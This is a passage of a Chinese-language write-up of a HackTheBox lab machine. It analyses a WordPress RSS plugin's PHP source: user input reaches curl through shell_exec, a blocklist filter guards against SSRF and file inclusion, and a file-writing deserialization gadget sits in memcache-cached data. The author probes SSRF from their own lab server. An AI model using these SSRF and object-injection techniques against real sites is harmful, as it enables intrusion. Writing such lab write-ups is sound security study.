class="hljs-title">url</span>)</span>&#123;<br>     <span class="hljs-keyword">require_once</span> ABSPATH . <span class="hljs-string">&#x27;/wp-includes/class-simplepie.php&#x27;</span>;    <br>     <span class="hljs-variable">$simplepie</span> = <span class="hljs-literal">null</span>;  <br>     <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">url_get_contents</span>(<span class="hljs-variable">$url</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;<br>         <span class="hljs-variable">$simplepie</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimplePie</span>();<br>         <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">set_cache_location</span>(<span class="hljs-string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);<br>         <span class="hljs-comment">//$simplepie-&gt;set_raw_data($data);</span><br>         <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">set_feed_url</span>(<span class="hljs-variable">$url</span>);<br>         <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br>         <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">handle_content_type</span>();<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$simplepie</span>-&gt;error) &#123;<br>             <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-variable">$simplepie</span>-&gt;error);<br>             <span class="hljs-variable">$simplepie</span> = <span class="hljs-literal">null</span>;<br>             <span class="hljs-variable">$failed</span> = True;<br>         &#125;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable">$failed</span> = True;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-variable">$simplepie</span>;<br>  &#125;<br><br> <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&quot;custom_feed_url&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-variable">$tmp</span> = (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-variable">$url</span>)); <br><span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$tmp</span>); <br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>;<br>  &#125;<br>  <span class="hljs-variable">$feed</span> = <span class="hljs-title function_ invoke__">get_feed</span>(<span class="hljs-variable">$url</span>); <br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$feed</span>-&gt;<span class="hljs-title function_ invoke__">error</span>())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;sp_errors&quot;&gt;&#x27;</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$feed</span>-&gt;<span class="hljs-title function_ invoke__">error</span>()) . <span class="hljs-string">&quot;&lt;/p&gt;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">chunk</span> <span class="hljs-title">focus</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">header</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">$<span class="hljs-title">link</span> = $<span class="hljs-title">feed</span>-&gt;<span class="hljs-title">get_link</span>();</span><br><span class="hljs-class">$<span class="hljs-title">title</span> = $<span class="hljs-title">feed</span>-&gt;<span class="hljs-title">get_title</span>();</span><br><span class="hljs-class"><span class="hljs-title">if</span> ($<span class="hljs-title">link</span>) </span><br><span class="hljs-class"></span>&#123; <br><span class="hljs-variable">$title</span> = <span class="hljs-string">&quot;&lt;a href=&#x27;<span class="hljs-subst">$link</span>&#x27; title=&#x27;<span class="hljs-subst">$title</span>&#x27;&gt;<span class="hljs-subst">$title</span>&lt;/a&gt;&quot;</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$title</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/h3&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$feed</span>-&gt;<span class="hljs-title function_ invoke__">get_description</span>(); <span class="hljs-meta">?&gt;</span><br><br>&lt;/div&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$feed</span>-&gt;<span class="hljs-title function_ invoke__">get_items</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>): <span class="hljs-meta">?&gt;</span><br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">chunk</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h4</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> ($<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_permalink</span>()) <span class="hljs-title">echo</span> &#x27;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;&#x27; . $<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_permalink</span>() . &#x27;&quot;&gt;&#x27;; <span class="hljs-title">echo</span> $<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_title</span>(); <span class="hljs-title">if</span> ($<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_permalink</span>()) <span class="hljs-title">echo</span> &#x27;&lt;/<span class="hljs-title">a</span>&gt;&#x27;; ?&gt;&amp;<span class="hljs-title">nbsp</span>;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">footnote</span>&quot;&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_date</span>(&#x27;<span class="hljs-title">j</span> <span class="hljs-title">M</span> <span class="hljs-title">Y</span>, <span class="hljs-title">g</span>:<span class="hljs-title">i</span> <span class="hljs-title">a</span>&#x27;); ?&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">h4</span>&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_content</span>(); ?&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">if</span> ($<span class="hljs-title">enclosure</span> = $<span class="hljs-title">item</span>-&gt;<span class="hljs-title">get_enclosure</span>(0))</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span> . <span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">embed</span>(<span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;audio&#x27;</span> =&gt; <span class="hljs-string">&#x27;./for_the_demo/place_audio.png&#x27;</span>,<br><span class="hljs-string">&#x27;video&#x27;</span> =&gt; <span class="hljs-string">&#x27;./for_the_demo/place_video.png&#x27;</span>,<br><span class="hljs-string">&#x27;mediaplayer&#x27;</span> =&gt; <span class="hljs-string">&#x27;./for_the_demo/mediaplayer.swf&#x27;</span>,<br><span class="hljs-string">&#x27;altclass&#x27;</span> =&gt; <span class="hljs-string">&#x27;download&#x27;</span><br>)) . <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_link</span>() &amp;&amp; <span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_type</span>())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;footnote&quot; align=&quot;center&quot;&gt;(&#x27;</span> . <span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_type</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_size</span>())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;; &#x27;</span> . <span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_size</span>() . <span class="hljs-string">&#x27; MB&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;)&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_thumbnail</span>())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div&gt;&lt;img src=&quot;&#x27;</span> . <span class="hljs-variable">$enclosure</span>-&gt;<span class="hljs-title function_ invoke__">get_thumbnail</span>() . <span class="hljs-string">&#x27;&quot; alt=&quot;&quot; /&gt;&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;/div&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br>&lt;/main&gt;<br><br>&lt;!--<br>DEBUG<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debug&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;debug.php&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>--&gt;<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">get_template_part</span>( <span class="hljs-string">&#x27;template-parts/footer-menus-widgets&#x27;</span> ); <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">get_footer</span>();<br><br><br></code></pre></td></tr></table></figure><p>它使用 memcache 将生成的内容存储长达 60 秒，并使用 xct_ 作为密钥的前缀:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">url_get_contents</span>(<span class="hljs-variable">$url</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;<br>      <span class="hljs-variable">$simplepie</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimplePie</span>();<br>      <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">set_cache_location</span>(<span class="hljs-string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);<br>      <span class="hljs-comment">//$simplepie-&gt;set_raw_data($data);</span><br>      <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">set_feed_url</span>(<span class="hljs-variable">$url</span>);<br>      <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br>      <span class="hljs-variable">$simplepie</span>-&gt;<span class="hljs-title function_ invoke__">handle_content_type</span>();<br></code></pre></td></tr></table></figure><p>自定义提要的 URL 通过<strong>custom_feed_url</strong>参数传递。:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&quot;custom_feed_url&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-variable">$tmp</span> = (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-variable">$url</span>)); <br><span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$tmp</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有一个<strong>debug.php</strong>脚本可以通过在 GET 请求中设置调试参数来启用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!--<br>DEBUG<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debug&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;debug.php&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>--&gt;<br></code></pre></td></tr></table></figure><p>另一个文件<strong>template.php</strong>包含一个过滤 custom_feed_url 参数的函数，以防止 SSRF 和本地文件包含攻击。它是基于黑名单校验的，只要出现localhost与127.0.0.1就会提示黑客企图被阻止(内部SSRF)。 事件已被记录  ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// this should be secure</span><br><span class="hljs-variable">$tmpUrl</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;file://&quot;</span>) !== <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;@&quot;</span>) !== <span class="hljs-literal">false</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;-o&quot;</span>) !== <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;-F&quot;</span>) !== <span class="hljs-literal">false</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>&#125;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST);<br><span class="hljs-comment">// preventing all localhost access</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmp</span> == <span class="hljs-string">&quot;localhost&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$tmp</span> == <span class="hljs-string">&quot;localhost&quot;</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$url</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是自定义 RSS 扩展用于检索提要的 XML 内容的实际函数。请注意，它使用 curl，因此如果参数未充分清理，则存在很大的命令注入风险。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">url_get_contents</span> (<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$pl</span> = <span class="hljs-string">&quot;curl &quot;</span>.<span class="hljs-variable">$url</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$pl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我想到了我刚刚在blog.travel.htb&#x2F;awesome-rss源码中看到的那个有趣的注释，它很像debug.php中的代码。</p><p>我可以本地启动一个http服务试一试，然后在浏览器中输入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.travel.htb<span class="hljs-regexp">/awesome-rss/</span>?custom_feed_url=http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span>:<span class="hljs-number">80</span>/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">└─# python -m http.server <span class="hljs-number">80</span>                                           <br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.10.189</span> - - <span class="hljs-string">[12/Apr/2022 15:14:12]</span> code <span class="hljs-number">404</span>, message File not found<br><span class="hljs-number">10.10.10.189</span> - - <span class="hljs-string">[12/Apr/2022 15:14:12]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /1.txt HTTP/1.1&quot;</span> <span class="hljs-number">404</span> -<br><span class="hljs-number">10.10.10.189</span> - - <span class="hljs-string">[12/Apr/2022 15:14:13]</span> code <span class="hljs-number">404</span>, message File not found<br><span class="hljs-number">10.10.10.189</span> - - <span class="hljs-string">[12/Apr/2022 15:14:13]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /1.txt HTTP/1.1&quot;</span> <span class="hljs-number">404</span> -<br></code></pre></td></tr></table></figure><p>很好，它们是对应的，那我如果把以下XML下载下来它不会按照它原本的格式去解析：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.travel.htb<span class="hljs-regexp">/newsfeed/</span>customfeed.xml<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412164247656.png" alt="image-20220412164247656"></p><p>看起来它可以。SSRF是存在的，他会将别处的XML文件通过自己内部的渲染解析以博客主题形式展现出来，对了它的页面源码中有debug。我试着去给debug传个参数：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.travel.htb<span class="hljs-regexp">/awesome-rss/</span>?debug=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>页面源代码中便会显示这样：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">DEBUG</span><br><span class="hljs-comment"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ </span><br><span class="hljs-comment">| xct_4e5612ba07(...) | a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...) |</span><br><span class="hljs-comment"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>它看起来像是php的序列化。而在第二个文件template.php 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php">└─<span class="hljs-comment"># cat template.php    </span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> Todo: finish logging implementation via TemplateHelper</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">// this should be secure</span><br>        <span class="hljs-variable">$tmpUrl</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;file://&quot;</span>) !== <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;@&quot;</span>) !== <span class="hljs-literal">false</span>)<br>        &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;-o&quot;</span>) !== <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$tmpUrl</span>, <span class="hljs-string">&quot;-F&quot;</span>) !== <span class="hljs-literal">false</span>)<br>        &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST);<br>        <span class="hljs-comment">// preventing all localhost access</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmp</span> == <span class="hljs-string">&quot;localhost&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$tmp</span> == <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>        &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$url</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">url_get_contents</span> (<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-variable">$pl</span> = <span class="hljs-string">&quot;curl &quot;</span>.<span class="hljs-variable">$url</span>;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$pl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateHelper</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">init</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">init</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$this</span>-&gt;data);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;    <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$data</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/logs/&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$this</span>-&gt;data);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>它存有一个TemplateHelper类的源代码，它有一个构造函数还有一个__wakeup魔术方法，很明显，SimplePie 正在序列化 PHP 对象，并将该数据缓存在 memcache 中 60 秒。如果我可以将自己的有效负载放入 memcache 中，当 SimplePie 